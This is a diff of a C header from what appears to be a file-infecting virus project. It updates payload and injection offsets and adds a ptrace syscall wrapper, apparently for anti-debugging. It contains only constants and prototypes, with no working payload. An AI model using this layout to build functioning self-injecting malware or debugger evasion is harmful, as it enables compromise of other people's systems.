@@ -21,13 +21,14 @@
 # define BUF_SIZE 0x20
 # define END_SIZE 0x97
 # define LOADER_SIZE 0xCD
-# define PAYLOAD_SIZE 0x2a89 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x29ef - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x2ae0 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x2a1e - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
 # define OFFSET_1 0x208a - FT_MEMCPY_ADDR
 # define OFFSET_2 0x21b1 - FT_MEMCPY_ADDR
-# define OFFSET_3 0x22d6 - FT_MEMCPY_ADDR
+# define OFFSET_3 0x22db - FT_MEMCPY_ADDR
+# define OFFSET_4 0x2a29 - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -81,12 +82,13 @@ int			check_process(char *buf_path);
 /*			**** LIB HANDLERS	****			*/
 void		ft_memcpy(void *dest, void *src, size_t size);
 void		ft_memcpy_r(void *dest, void *src, size_t size);
-void		ft_bzero(void *ptr, size_t size);
+void		ft_memset(void *ptr, size_t size, unsigned char val);
 char		*ft_strcat(char *dest, const char *src);
 int			ft_sysopen(const char *pathname, int flags);
 int			ft_sysclose(int fd);
 ssize_t 	ft_syswrite(int fd, const void *buf, size_t count);
 void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
+int			ft_sysptrace(long request, long pid, unsigned long addr, unsigned long data);
 void		*ft_sysmunmap(void *addr, size_t len);
 int			ft_sysfstat(int fd, struct stat *buf); 
 int			ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
